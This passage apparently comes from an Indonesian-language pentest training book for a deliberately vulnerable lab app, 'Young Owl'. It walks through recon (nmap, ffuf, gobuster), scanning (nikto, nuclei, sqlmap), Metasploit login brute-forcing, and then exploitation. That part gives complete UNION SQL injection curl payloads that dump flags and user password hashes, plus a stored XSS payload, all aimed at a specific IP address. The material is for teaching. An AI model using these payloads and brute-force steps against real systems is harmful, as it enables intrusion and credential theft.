+    <div class="exp"><b>Penjelasan:</b> <code>whatweb</code> menebak teknologi dari pola respons.
+      <code>-a 3</code> = <i>aggression level 3</i> (0–4): makin tinggi makin banyak probe dikirim, makin akurat,
+      tapi makin "berisik" di log. Level 3 seimbang untuk lab.</div>
+
+    <h3>3.3 Apakah ada WAF? <code>wafw00f</code></h3>
+    <pre><code>wafw00f http://72.62.120.97:8080</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>wafw00f</code> mengirim permintaan jahil ringan lalu melihat apakah ada
+      "tembok" (Web Application Firewall) yang memblokir. Di lab biasanya <i>no WAF</i> — artinya payload Anda
+      sampai apa adanya ke aplikasi.</div>
+
+    <h3>3.4 File petunjuk: <code>robots.txt</code> &amp; sejenisnya</h3>
+    <pre><code>curl -s http://72.62.120.97:8080/robots.txt
+curl -s http://72.62.120.97:8080/sitemap.xml</code></pre>
+    <div class="exp"><b>Penjelasan:</b> dua berkas ini kadang menyebut path yang "tidak ingin diindeks" — justru
+      petunjuk berharga. <code>-s</code> agar bersih. Tidak ada output = berkas tidak ada (tetap informasi).</div>
+
+    <h3>3.5 Pemetaan port &amp; versi: Nmap mendalam</h3>
+    <pre><code>nmap -sV -sC -p 8080 -T4 -oN nmap-lab.txt 72.62.120.97</code></pre>
+    <table>
+      <tr><th>Opsi</th><th>Arti &amp; alasan</th></tr>
+      <tr><td><code>nmap</code></td><td>Pemindai jaringan: menemukan port terbuka &amp; layanan di baliknya.</td></tr>
+      <tr><td><code>-sV</code></td><td><i>service/version</i>: tebak nama &amp; versi layanan tiap port (mis. "Node.js http").</td></tr>
+      <tr><td><code>-sC</code></td><td>Jalankan skrip NSE <i>default</i> — pengecekan umum aman (judul halaman, metode HTTP, dll.).</td></tr>
+      <tr><td><code>-p 8080</code></td><td>Hanya pindai port 8080 (port lab). Lebih cepat &amp; terfokus daripada semua 65.535 port.</td></tr>
+      <tr><td><code>-T4</code></td><td><i>timing template</i> 4 (0–5): cukup cepat untuk jaringan stabil. 5 paling agresif/berisik.</td></tr>
+      <tr><td><code>-oN nmap-lab.txt</code></td><td><i>output normal</i> ke berkas — bukti untuk laporan.</td></tr>
+      <tr><td><code>72.62.120.97</code></td><td>IP target (bukan URL; Nmap bekerja di level jaringan).</td></tr>
+    </table>
+    <div class="note"><b>Varian berguna:</b> <code>-p-</code> memindai semua port (lama), <code>-Pn</code> melewati ping
+      (berguna bila host memblokir ICMP), <code>--script http-headers</code> menambah inspeksi header.</div>
+
+    <h3>3.6 Menemukan endpoint tersembunyi: <code>ffuf</code></h3>
+    <p>Anda hanya tahu endpoint login. Bagaimana menemukan sisanya? <b>Fuzzing</b>: coba ribuan nama path dan lihat
+      mana yang tidak 404.</p>
+    <pre><code>ffuf -u http://72.62.120.97:8080/api/v1/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+  -mc 200,401,403 -t 40 -o ffuf-api.json</code></pre>
+    <table>
+      <tr><th>Opsi</th><th>Arti &amp; alasan</th></tr>
+      <tr><td><code>ffuf</code></td><td><i>Fuzz Faster U Fool</i>: pemfuzz web cepat berbasis daftar kata.</td></tr>
+      <tr><td><code>-u ...FUZZ</code></td><td>URL target; kata <code>FUZZ</code> adalah titik sisip — tiap kata kamus menggantikannya.</td></tr>
+      <tr><td><code>-w .../api-endpoints.txt</code></td><td><i>wordlist</i>: daftar nama path yang dicoba (dari SecLists).</td></tr>
+      <tr><td><code>-mc 200,401,403</code></td><td><i>match code</i>: tampilkan hanya respons berkode 200/401/403. 401/403 = "ada tapi butuh login" — tetap bukti endpoint hidup.</td></tr>
+      <tr><td><code>-t 40</code></td><td><i>threads</i>: 40 permintaan paralel. Naikkan hati-hati agar lab tidak kewalahan.</td></tr>
+      <tr><td><code>-o ffuf-api.json</code></td><td>Simpan hasil ke berkas JSON untuk laporan.</td></tr>
+    </table>
+    <div class="exp"><b>Apa yang Anda cari:</b> endpoint seperti <code>targets</code>, <code>assessments</code>,
+      <code>files</code>, <code>tools</code>, <code>system</code>. Itu pintu-pintu yang akan diserang di BAB 6.</div>
+
+    <h3>3.7 Alternatif direktori: <code>gobuster</code></h3>
+    <pre><code>gobuster dir -u http://72.62.120.97:8080 \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -s 200,204,301,302,401,403 -b "" -t 30</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>gobuster dir</code> mode direktori. <code>-s</code> status yang
+      ditampilkan; <code>-b ""</code> mengosongkan daftar status yang <i>diabaikan</i> agar <code>-s</code> yang
+      memutuskan. <code>-t 30</code> 30 thread. Fungsinya mirip ffuf — gunakan yang Anda sukai.</div>
+
+    <h3>3.8 Penemuan parameter</h3>
+    <p>Sebuah endpoint seperti <code>/targets/search</code> menerima parameter. Menemukan nama parameter yang benar
+      (<code>q</code>) penting agar SQLi (BAB 6.1) berhasil.</p>
+    <pre><code>ffuf -u "http://72.62.120.97:8080/api/v1/targets/search?FUZZ=test" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -b "$(cat cookies.txt | grep -o 'sid.*')" -mc 200 -fs 0 -t 30</code></pre>
+    <div class="exp"><b>Penjelasan:</b> di sini <code>FUZZ</code> ada di <b>nama parameter</b>. <code>-fs 0</code> =
+      <i>filter size 0</i>, sembunyikan respons kosong. Parameter yang mengubah ukuran respons = parameter yang
+      "didengar" server. Untuk lab Young Owl, parameter kuncinya adalah <code>q</code> pada <code>/targets/search</code>.</div>
+    <div class="note"><b>Catatan sesi:</b> endpoint ini butuh login, jadi <code>ffuf</code> perlu cookie. Cara paling
+      mudah &amp; andal untuk eksplorasi manual tetap memakai <code>curl -b cookies.txt</code> (BAB 2.5).</div>
+
+    <h3>3.9 Enumerasi metode HTTP</h3>
+    <p>Satu endpoint bisa menerima beberapa metode. Mengetahui metode mana yang diizinkan membuka vektor yang tak
+      terlihat dari UI.</p>
+    <pre><code>curl -s -X OPTIONS -i -b cookies.txt \
+  "http://72.62.120.97:8080/api/v1/assessments" | grep -i allow</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>-X OPTIONS</code> menanyakan "metode apa yang boleh?"; <code>-i</code>
+      menyertakan header respons; <code>grep -i allow</code> menyaring baris <code>Allow:</code>. Bila muncul
+      <code>DELETE</code>/<code>PUT</code> yang tak Anda duga, catat sebagai area uji otorisasi.</div>
+
+    <h3>3.10 Memilih wordlist yang tepat</h3>
+    <p>Kualitas fuzzing bergantung pada daftar kata. SecLists (<code>/usr/share/seclists</code>) menyediakan banyak:</p>
+    <table>
+      <tr><th>Wordlist</th><th>Untuk</th></tr>
+      <tr><td><code>Discovery/Web-Content/common.txt</code></td><td>Direktori &amp; file umum — pindai cepat awal.</td></tr>
+      <tr><td><code>.../api/api-endpoints.txt</code></td><td>Nama endpoint API (seperti lab ini).</td></tr>
+      <tr><td><code>.../raft-medium-directories.txt</code></td><td>Direktori lebih dalam, keseimbangan ukuran/cakupan.</td></tr>
+      <tr><td><code>.../burp-parameter-names.txt</code></td><td>Nama parameter query/body.</td></tr>
+      <tr><td><code>Usernames/top-usernames-shortlist.txt</code></td><td>Tebakan username untuk login.</td></tr>
+      <tr><td><code>Passwords/Leaked-Databases/rockyou.txt</code></td><td>Password bocoran — untuk brute (BAB 6.6).</td></tr>
+    </table>
+    <div class="note"><b>Tip:</b> mulai dari wordlist kecil (<code>common</code>/<code>api-endpoints</code>) agar cepat,
+      baru naik ke <code>raft-medium</code> bila perlu lebih dalam. Wordlist besar = lebih lama &amp; lebih berisik.</div>
+
+    <h3>3.11 Apa yang dilakukan dengan tiap temuan</h3>
+    <table>
+      <tr><th>Temuan recon</th><th>Langkah berikutnya</th></tr>
+      <tr><td>Endpoint <code>/targets/search</code> menerima <code>q</code></td><td>Uji SQLi (BAB 6.1).</td></tr>
+      <tr><td>Endpoint <code>/files?name=</code></td><td>Uji path traversal (BAB 6.4a).</td></tr>
+      <tr><td>Endpoint <code>/tools/lookup</code> (POST)</td><td>Uji command injection (BAB 6.4b).</td></tr>
+      <tr><td><code>/system/debug</code> 200 tanpa login</td><td>Baca konfigurasi &amp; flag (BAB 6.5).</td></tr>
+      <tr><td>Login membedakan pesan error</td><td>Enumerasi &amp; brute (BAB 6.6).</td></tr>
+      <tr><td>Id assessment berurutan</td><td>Uji IDOR (BAB 6.3).</td></tr>
+    </table>
+    <div class="exp"><b>Inti bab recon:</b> Anda masuk tanpa tahu apa-apa dan keluar dengan <i>peta serangan</i> — daftar
+      endpoint, parameter, dan dugaan celah. Semua eksploitasi di BAB 6 hanyalah menindaklanjuti peta ini.</div>
+
+    <!-- BAB 4 -->
+    <h2 class="chapter"><span class="n">BAB 4</span>Vulnerability Scanning</h2>
+    <p class="lead">Setelah peta jadi, kita cari celahnya. Scanner otomatis cepat menyapu permukaan; verifikasi manual
+      memastikan temuan nyata (bukan false positive). Keduanya saling melengkapi.</p>
+
+    <h3>4.1 <code>nikto</code> — pemindai web klasik</h3>
+    <pre><code>nikto -h http://72.62.120.97:8080 -o nikto-lab.txt</code></pre>
+    <table>
+      <tr><th>Opsi</th><th>Arti</th></tr>
+      <tr><td><code>nikto</code></td><td>Pemindai yang mencari file berisiko, konfigurasi keliru, &amp; header hilang.</td></tr>
+      <tr><td><code>-h ...</code></td><td><i>host</i> target (URL lengkap dengan port).</td></tr>
+      <tr><td><code>-o nikto-lab.txt</code></td><td>Simpan laporan ke berkas.</td></tr>
+    </table>
+    <div class="exp"><b>Yang disorot untuk lab:</b> endpoint tanpa auth seperti <code>/api/v1/system/debug</code>
+      (membocorkan konfigurasi) dan ketiadaan header keamanan. Ini mengarahkan Anda ke BAB 6.5 &amp; 6.7.</div>
+
+    <h3>4.2 <code>nuclei</code> — pemindai berbasis template</h3>
+    <pre><code>nuclei -u http://72.62.120.97:8080 \
+  -t http/exposures/ -t http/misconfiguration/ -severity low,medium,high,critical \
+  -o nuclei-lab.txt</code></pre>
+    <table>
+      <tr><th>Opsi</th><th>Arti</th></tr>
+      <tr><td><code>nuclei</code></td><td>Mencocokkan target dengan ribuan <i>template</i> celah yang sudah dikurasi komunitas.</td></tr>
+      <tr><td><code>-u ...</code></td><td>URL target tunggal.</td></tr>
+      <tr><td><code>-t http/exposures/</code></td><td>Pakai set template kategori "exposures" (kebocoran info). Bisa diulang untuk kategori lain.</td></tr>
+      <tr><td><code>-severity ...</code></td><td>Saring berdasarkan tingkat keparahan agar fokus pada yang penting.</td></tr>
+      <tr><td><code>-o nuclei-lab.txt</code></td><td>Simpan temuan.</td></tr>
+    </table>
+    <div class="note">Perbarui template dulu dengan <code>nuclei -update-templates</code> agar deteksi terkini.</div>
+
+    <h3>4.3 <code>sqlmap</code> — konfirmasi SQL injection</h3>
+    <p>Endpoint <code>/targets/search?q=</code> rentan SQLi. <code>sqlmap</code> mengotomatiskan pembuktian &amp;
+      eksploitasinya. Karena endpoint butuh login, sertakan cookie Anda.</p>
+    <pre><code>sqlmap -u "http://72.62.120.97:8080/api/v1/targets/search?q=1" \
+  --cookie="$(grep -oE 'sid[^\s]*' cookies.txt | tail -1)" \
+  --batch --level=2 --risk=2 --dbms=postgresql -p q</code></pre>
+    <table>
+      <tr><th>Opsi</th><th>Arti &amp; alasan</th></tr>
+      <tr><td><code>-u "..."</code></td><td>URL yang punya parameter rentan. Nilai <code>q=1</code> sekadar titik awal.</td></tr>
+      <tr><td><code>--cookie="..."</code></td><td>Kirim cookie sesi — tanpa ini sqlmap kena <code>UNAUTHENTICATED</code>.</td></tr>
+      <tr><td><code>--batch</code></td><td>Jawab semua pertanyaan dengan default — jalan tanpa interaksi.</td></tr>
+      <tr><td><code>--level=2</code></td><td>Kedalaman uji (1–5): makin tinggi makin banyak tempat &amp; teknik dicoba.</td></tr>
+      <tr><td><code>--risk=2</code></td><td>Keagresifan payload (1–3): 2 menambah teknik tanpa payload berisiko tinggi.</td></tr>
+      <tr><td><code>--dbms=postgresql</code></td><td>Beri tahu database-nya PostgreSQL — mempercepat &amp; menajamkan payload.</td></tr>
+      <tr><td><code>-p q</code></td><td>Fokuskan uji ke parameter <code>q</code> (yang memang rentan).</td></tr>
+    </table>
+    <div class="exp"><b>Lanjutan yang berguna setelah terbukti rentan:</b>
+      <ul style="margin:1mm 0 0">
+        <li><code>--dbs</code> — daftar semua database.</li>
+        <li><code>--tables -D &lt;db&gt;</code> — daftar tabel dalam satu database.</li>
+        <li><code>--dump -T users -D &lt;db&gt;</code> — tarik isi tabel <code>users</code> (email &amp; hash).</li>
+      </ul>
+      Di BAB 6.1 kita lakukan hal yang sama <b>manual</b> dengan UNION agar paham mekanismenya.</div>
+    <div class="warn-box"><b>Hati-hati:</b> jalankan sqlmap <b>hanya</b> ke IP lab. Jangan pernah ke subdomain control
+      center atau host lain.</div>
+
+    <h3>4.4 Pemetaan manual ke OWASP Top 10</h3>
+    <p>Scanner tidak menangkap celah <i>logika aplikasi</i> (seperti IDOR). Petakan temuan Anda:</p>
+    <table>
+      <tr><th>Kategori OWASP</th><th>Celah di lab Young Owl</th><th>Dibahas</th></tr>
+      <tr><td>A01 Broken Access Control</td><td>IDOR pada export assessment</td><td>BAB 6.3</td></tr>
+      <tr><td>A03 Injection</td><td>SQLi (<code>/targets/search</code>), RCE (<code>/tools/lookup</code>)</td><td>BAB 6.1, 6.4</td></tr>
+      <tr><td>A03 Injection (XSS)</td><td>Stored XSS via deskripsi vulnerability</td><td>BAB 6.2</td></tr>
+      <tr><td>A05 Security Misconfiguration</td><td>Debug endpoint tanpa auth, enumerasi login</td><td>BAB 6.5, 6.6</td></tr>
+      <tr><td>A01/Path</td><td>Path traversal pada <code>/files</code></td><td>BAB 6.4</td></tr>
+    </table>
+
+    <h3>4.5 Membaca output scanner tanpa tertipu</h3>
+    <p>Scanner cepat tapi sering salah. Dua jebakan pemula:</p>
+    <ul>
+      <li><b>False positive</b> — scanner bilang "rentan" padahal tidak. Selalu verifikasi manual (mis. dengan curl)
+        sebelum menulisnya di laporan.</li>
+      <li><b>False negative</b> — scanner <i>melewatkan</i> celah logika (IDOR, enumerasi). Karena itu bab 6 banyak
+        memakai uji manual.</li>
+    </ul>
+    <div class="exp"><b>Disiplin verifikasi:</b> untuk tiap temuan scanner, ulangi dengan satu perintah curl yang
+      jelas &amp; simpan respons sebagai bukti. "Terbukti" berarti Anda bisa menunjukkan permintaan + jawaban yang
+      membuktikannya, bukan sekadar baris output scanner.</div>
+    <h4>Contoh menafsirkan temuan sqlmap</h4>
+    <table>
+      <tr><th>Baris sqlmap</th><th>Artinya</th></tr>
+      <tr><td><code>parameter 'q' is vulnerable</code></td><td>Injeksi terbukti pada parameter <code>q</code>.</td></tr>
+      <tr><td><code>Type: UNION query</code></td><td>Teknik yang berhasil (sejalan BAB 6.1).</td></tr>
+      <tr><td><code>back-end DBMS: PostgreSQL</code></td><td>Konfirmasi database — cocok dengan <code>--dbms</code>.</td></tr>
+      <tr><td><code>available databases [N]</code></td><td>Hasil <code>--dbs</code>: daftar database yang terbaca.</td></tr>
+    </table>
+
+    <h3>4.6 Etika kebisingan &amp; dampak ke lab</h3>
+    <div class="warn-box"><b>Hati-hati beban:</b> scanner seperti nuclei/ffuf mengirim ribuan permintaan. Di lab
+      pribadi ini aman, tetapi turunkan konkurensi (<code>-t</code>) bila lab melambat, dan jangan jalankan beberapa
+      scanner berat sekaligus. Ini juga melatih kebiasaan "low and slow" untuk lingkungan produksi (yang hanya boleh
+      Anda sentuh dengan izin tertulis).</div>
+
+    <!-- BAB 5 -->
+    <h2 class="chapter"><span class="n">BAB 5</span>Metasploit Framework</h2>
+    <p class="lead">Metasploit adalah "kotak perkakas" serangan paling terkenal. Bab ini mengenalkan konsep &amp;
+      alurnya, lalu jujur soal di mana ia cocok untuk lab Young Owl dan di mana <code>curl</code>/Burp lebih tepat.</p>
+
+    <h3>5.1 Konsep inti</h3>
+    <ul>
+      <li><strong>Module</strong> — satuan kerja. Jenis utama: <code>exploit</code> (menyerang celah),
+        <code>auxiliary</code> (scan/recon/brute, tanpa payload), <code>payload</code> (kode yang jalan setelah berhasil).</li>
+      <li><strong>Datastore options</strong> — variabel seperti <code>RHOSTS</code> (target), <code>RPORT</code> (port),
+        <code>TARGETURI</code> (path) yang Anda isi sebelum menjalankan modul.</li>
+      <li><strong>msfconsole</strong> — antarmuka baris perintah utamanya.</li>
+    </ul>
+    <div class="exp"><b>Kejujuran penting:</b> celah Young Owl adalah <b>logika aplikasi</b> (SQLi lewat parameter,
+      IDOR, XSS tersimpan, RCE lewat field <code>host</code>). Metasploit paling kuat untuk celah <i>layanan/versi</i>
+      yang ada exploit jadinya. Jadi untuk <b>mengeksploitasi</b> celah lab, <code>curl</code>/Burp/sqlmap lebih tepat
+      dan lebih bisa dijelaskan. Namun Metasploit tetap berguna untuk <b>recon HTTP</b> — dan itu yang kita pakai.</div>
+
+    <h4>Kategori modul yang perlu Anda kenal</h4>
+    <table>
+      <tr><th>Kategori</th><th>Isi</th><th>Relevansi ke lab</th></tr>
+      <tr><td><code>auxiliary/scanner/http/*</code></td><td>Recon &amp; pemindaian HTTP.</td><td>Dipakai (versi, header, direktori, login).</td></tr>
+      <tr><td><code>exploit/*</code></td><td>Serangan ke celah layanan tertentu.</td><td>Kurang relevan — celah lab = logika aplikasi.</td></tr>
+      <tr><td><code>payload/*</code></td><td>Kode pasca-eksploitasi (shell/Meterpreter).</td><td>Tak terpakai (tak ada exploit layanan).</td></tr>
+      <tr><td><code>post/*</code></td><td>Aksi setelah dapat sesi.</td><td>Tak terpakai di lab ini.</td></tr>
+      <tr><td><code>encoder/*</code>, <code>nop/*</code></td><td>Mengolah payload.</td><td>Tak terpakai.</td></tr>
+    </table>
+    <div class="exp"><b>Ambil pelajaran:</b> mengenali kategori membantu Anda tahu kapan Metasploit alat yang tepat.
+      Untuk Young Owl, kekuatannya ada di <code>auxiliary/scanner/http</code>; eksploitasi celah aplikasinya tetap lewat
+      curl/Burp/sqlmap.</div>
+
+    <h3>5.2 Alur dasar msfconsole</h3>
+    <pre><code>msfconsole -q
+<span class="c">msf6 &gt;</span> search type:auxiliary http
+<span class="c">msf6 &gt;</span> use auxiliary/scanner/http/http_version
+<span class="c">msf6 &gt;</span> info
+<span class="c">msf6 &gt;</span> set RHOSTS 72.62.120.97
+<span class="c">msf6 &gt;</span> set RPORT 8080
+<span class="c">msf6 &gt;</span> run</code></pre>
+    <table>
+      <tr><th>Perintah</th><th>Arti</th></tr>
+      <tr><td><code>msfconsole -q</code></td><td>Buka konsol; <code>-q</code> (<i>quiet</i>) tanpa banner.</td></tr>
+      <tr><td><code>search type:auxiliary http</code></td><td>Cari modul auxiliary bertema http.</td></tr>
+      <tr><td><code>use &lt;path&gt;</code></td><td>Pilih/aktifkan modul itu sebagai modul aktif.</td></tr>
+      <tr><td><code>info</code></td><td>Tampilkan deskripsi &amp; opsi modul (apa yang harus di-<code>set</code>).</td></tr>
+      <tr><td><code>set RHOSTS / RPORT</code></td><td>Isi target &amp; port.</td></tr>
+      <tr><td><code>run</code> (atau <code>exploit</code>)</td><td>Jalankan modul.</td></tr>
+    </table>
+
+    <h3>5.3 Modul auxiliary HTTP yang relevan ke <code>72.62.120.97:8080</code></h3>
+    <table>
+      <tr><th>Modul</th><th>Gunanya di lab</th></tr>
+      <tr><td><code>auxiliary/scanner/http/http_version</code></td><td>Ambil banner/versi server HTTP — fingerprint cepat.</td></tr>
+      <tr><td><code>auxiliary/scanner/http/http_header</code></td><td>Periksa header respons (termasuk header keamanan yang hilang).</td></tr>
+      <tr><td><code>auxiliary/scanner/http/dir_scanner</code></td><td>Brute direktori umum — pelengkap ffuf/gobuster.</td></tr>
+      <tr><td><code>auxiliary/scanner/http/robots_txt</code></td><td>Ambil &amp; tampilkan <code>robots.txt</code>.</td></tr>
+      <tr><td><code>auxiliary/scanner/http/http_login</code></td><td>Uji kredensial HTTP (bila form cocok) — paralel dengan Hydra.</td></tr>
+    </table>
+    <h4>Contoh: direktori scan terhadap lab</h4>
+    <pre><code><span class="c">msf6 &gt;</span> use auxiliary/scanner/http/dir_scanner
+<span class="c">msf6 &gt;</span> set RHOSTS 72.62.120.97
+<span class="c">msf6 &gt;</span> set RPORT 8080
+<span class="c">msf6 &gt;</span> set PATH /
+<span class="c">msf6 &gt;</span> run</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>PATH /</code> titik awal pencarian direktori. Hasilnya daftar path yang
+      merespons. Anggap ini sudut pandang kedua untuk memverifikasi penemuan dari BAB 3.6–3.7.</div>
+    <div class="note"><b>Payload &amp; sesi Meterpreter</b> (reverse shell canggih Metasploit) tidak cocok di sini karena
+      tak ada exploit layanan yang memberi eksekusi kode langsung — eksekusi kode di lab datang dari celah aplikasi
+      <code>/tools/lookup</code>, yang kita tangani manual di BAB 6.4 &amp; 7.</div>
+
+    <h3>5.4 Contoh lengkap: <code>http_login</code> terhadap login lab</h3>
+    <p>Sebagai pendamping Hydra (BAB 6.6), Metasploit bisa menguji kredensial lewat modul <code>http_login</code>.
+      Perhatikan bahwa login lab menerima body JSON, jadi modul form-standar cocok untuk latihan konsep, sedangkan
+      Hydra dengan template JSON lebih presisi untuk endpoint ini.</p>
+    <pre><code><span class="c">msf6 &gt;</span> use auxiliary/scanner/http/http_login
+<span class="c">msf6 &gt;</span> set RHOSTS 72.62.120.97
+<span class="c">msf6 &gt;</span> set RPORT 8080
+<span class="c">msf6 &gt;</span> set USERNAME intern@youngowl.lab
+<span class="c">msf6 &gt;</span> set PASS_FILE /usr/share/wordlists/rockyou.txt
+<span class="c">msf6 &gt;</span> set STOP_ON_SUCCESS true
+<span class="c">msf6 &gt;</span> set VERBOSE false
+<span class="c">msf6 &gt;</span> run</code></pre>
+    <table>
+      <tr><th>Opsi</th><th>Arti</th></tr>
+      <tr><td><code>USERNAME</code></td><td>Satu akun yang diuji (di sini <code>intern</code> yang lemah).</td></tr>
+      <tr><td><code>PASS_FILE</code></td><td>Kamus password yang dicoba satu per satu.</td></tr>
+      <tr><td><code>STOP_ON_SUCCESS</code></td><td>Berhenti begitu satu password cocok — hemat waktu.</td></tr>
+      <tr><td><code>VERBOSE</code></td><td><code>false</code> agar hanya kecocokan yang ditampilkan.</td></tr>
+    </table>
+    <div class="exp"><b>Penjelasan:</b> konsepnya identik dengan Hydra — coba banyak password terhadap satu akun. Yang
+      Anda pelajari di sini: cara mengisi <i>datastore options</i> (<code>set ...</code>) sebuah modul auxiliary dan
+      menjalankannya. Untuk endpoint JSON spesifik Young Owl, hasil paling andal tetap dari Hydra bertemplate JSON
+      (BAB 6.6) atau loop <code>curl</code> sederhana.</div>
+    <h4>Mencatat hasil Metasploit ke database workspace</h4>
+    <pre><code><span class="c">msf6 &gt;</span> workspace -a youngowl-lab
+<span class="c">msf6 &gt;</span> hosts
+<span class="c">msf6 &gt;</span> services
+<span class="c">msf6 &gt;</span> creds</code></pre>
+    <div class="exp"><b>Penjelasan:</b> Metasploit menyimpan temuan (host, layanan, kredensial) ke workspace. Perintah
+      <code>hosts</code>/<code>services</code>/<code>creds</code> menampilkannya — berguna untuk menyusun lampiran
+      laporan secara rapi.</div>
+
+    <!-- BAB 6 -->
+    <h2 class="chapter"><span class="n">BAB 6</span>Exploitation per Celah (termasuk XSS)</h2>
+    <p class="lead">Inti buku. Tiap celah: apa, lokasinya, perintah lengkap, penjelasan tiap bagian, dan bukti (flag).
+      Semua membutuhkan sesi login (BAB 2.4) kecuali disebut lain.</p>
+
+    <h3>6.1 SQL Injection — membaca data yang bukan milik Anda</h3>
+    <p>Endpoint <code>/api/v1/targets/search?q=</code> menyisipkan input Anda langsung ke query SQL yang memilih
+      <b>6 kolom</b>. Dengan <code>UNION SELECT</code> kita tempelkan query kedua untuk membaca tabel lain.</p>
+    <h4>Langkah 1 — buktikan ada injeksi</h4>
+    <pre><code>curl -s -b cookies.txt \
+  "http://72.62.120.97:8080/api/v1/targets/search?q=%27" | jq</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>%27</code> adalah tanda kutip tunggal <code>'</code> yang di-URL-encode.
+      Menyuntik satu kutip merusak sintaks SQL; bila server membalas <b>pesan error database</b>, itu bukti kuat
+      endpoint rentan (error dibocorkan ke klien — kesalahan tersendiri).</div>
+    <h4>Langkah 2 — ambil flag SQLi lewat UNION (6 kolom)</h4>
+    <pre><code>curl -s -b cookies.txt \
+  "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20UNION%20SELECT%20id,name,value,hint,created_at::text,%27x%27%20FROM%20lab_flags--%20" | jq</code></pre>
+    <div class="exp"><b>Penjelasan payload (sudah di-encode agar aman di URL):</b>
+      <ul style="margin:1mm 0 0">
+        <li><code>xyz'</code> — tutup string pencarian yang asli.</li>
+        <li><code>UNION SELECT ...</code> — gabungkan hasil dari query kedua. Harus <b>tepat 6 kolom</b> agar cocok.</li>
+        <li><code>id,name,value,hint,created_at::text,'x'</code> — 6 kolom; <code>value</code> berisi flag.
+          <code>::text</code> mengubah tanggal jadi teks agar tipe cocok; <code>'x'</code> pengisi kolom ke-6.</li>
+        <li><code>FROM lab_flags</code> — tabel penyimpan flag.</li>
+        <li><code>-- </code> (dengan spasi) — mengomentari sisa query asli agar tidak mengganggu.</li>
+      </ul>
+      <b>Hasil:</b> nilai <code>value</code> = <code>YO{un10n_s3l3ct_th3_0wl}</code>.</div>
+    <div class="note"><b>Skor keparahan:</b> SQLi pembaca seluruh database = <b>Critical</b> (CVSS ~9.8). Alasan: tanpa
+      hak khusus, penyerang jarak jauh bisa membaca kredensial semua pengguna — kerahasiaan runtuh total.</div>
+    <h4>Langkah 3 — dump pengguna (email &amp; hash)</h4>
+    <pre><code>curl -s -b cookies.txt \
+  "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20UNION%20SELECT%20id,email,password_hash,display_name,role_id::text,is_active::text%20FROM%20users--%20" | jq</code></pre>
+    <div class="exp"><b>Penjelasan:</b> sama polanya, tapi dari tabel <code>users</code> dengan kolom
+      <code>id,email,password_hash,display_name,role_id,is_active</code>. Ini menunjukkan dampak nyata SQLi:
+      pencurian kredensial. Di laporan, inilah bukti tingkat <i>critical</i>.</div>
+    <h4>Memahami "mengapa 6 kolom": hitung manual dengan <code>ORDER BY</code></h4>
+    <p>Dari mana angka 6 berasal? Di dunia nyata Anda belum tahu jumlah kolom. Cara klasik menghitungnya adalah
+      menaikkan <code>ORDER BY</code> sampai error:</p>
+    <pre><code>curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20ORDER%20BY%205--%20" | jq
+curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20ORDER%20BY%206--%20" | jq
+curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20ORDER%20BY%207--%20" | jq</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>ORDER BY N</code> mengurutkan berdasarkan kolom ke-N. Selama N ≤ jumlah
+      kolom, query jalan (200). Begitu N melebihi (di sini 7), server error — berarti jumlah kolom = N−1 = 6. Inilah
+      alasan UNION kita memakai tepat 6 kolom. Teknik ini mengajarkan Anda <i>menemukan</i>, bukan sekadar menyalin.</div>
+    <h4>Varian teknik SQLi (kapan dipakai)</h4>
+    <table>
+      <tr><th>Teknik</th><th>Kapan</th><th>Inti</th></tr>
+      <tr><td>Error-based</td><td>Server membocorkan pesan error (lab ini ya).</td><td>Baca data dari teks error.</td></tr>
+      <tr><td>UNION-based</td><td>Query menampilkan hasil ke halaman.</td><td>Tempel query kedua (dipakai di 6.1).</td></tr>
+      <tr><td>Boolean-blind</td><td>Tak ada output/err, tapi respons beda saat benar/salah.</td><td>Tanya ya/tidak satu per satu.</td></tr>
+      <tr><td>Time-based blind</td><td>Respons selalu sama.</td><td>Pakai <code>pg_sleep()</code>; ukur jeda waktu.</td></tr>
+    </table>
+    <div class="detect"><b>Deteksi &amp; perbaikan:</b> gunakan <i>parameterized query</i> (prepared statement), jangan
+      pernah menyambung string input ke SQL; jangan bocorkan pesan error DB; batasi hak akun database.</div>
+
+    <h3>6.2 Stored XSS — menyuntik skrip yang tersimpan</h3>
+    <p>Endpoint yang benar adalah <b><code>POST /api/v1/assessments/:id/vulnerabilities</code></b> (bukan
+      <code>/findings</code>). Field <code>description</code> dirender mentah, sehingga HTML/JS tersimpan dan berjalan
+      saat halaman dibuka.</p>
+    <div class="warn-box"><b>Jebakan tanda kutip (ingat BAB 1.3).</b> Jangan taruh tanda kutip tunggal di dalam
+      payload bila body dibungkus <code>-d '...'</code>, atau Anda dapat <code>"Body is not valid JSON"</code>.</div>
+    <h4>Cara A — payload tanpa kutip (paling mudah)</h4>
+    <pre><code>curl -s -b cookies.txt -X POST \
+  "http://72.62.120.97:8080/api/v1/assessments/ISI_ID_ASSESSMENT/vulnerabilities" \
+  -H 'content-type: application/json' \
+  -d '{"title":"xss uji","category":"xss","severity":"high","description":"&lt;img src=x onerror=document.title=document.domain&gt;"}'</code></pre>
+    <div class="exp"><b>Penjelasan tiap bagian:</b>
+      <ul style="margin:1mm 0 0">
+        <li><code>-X POST</code> — kita membuat data baru.</li>
+        <li><code>ISI_ID_ASSESSMENT</code> — ganti dengan <code>id</code> assessment Anda (dicatat di BAB 2.5).</li>
+        <li><code>title</code>, <code>category</code>, <code>severity</code> — field wajib menurut skema
+          (<code>severity</code> atau <code>cvssVector</code> salah satu harus ada).</li>
+        <li><code>description</code> — tempat payload. <code>&lt;img src=x onerror=...&gt;</code> memuat gambar yang
+          pasti gagal, memicu <code>onerror</code> yang menjalankan JS — <b>tanpa</b> satu pun tanda kutip.</li>
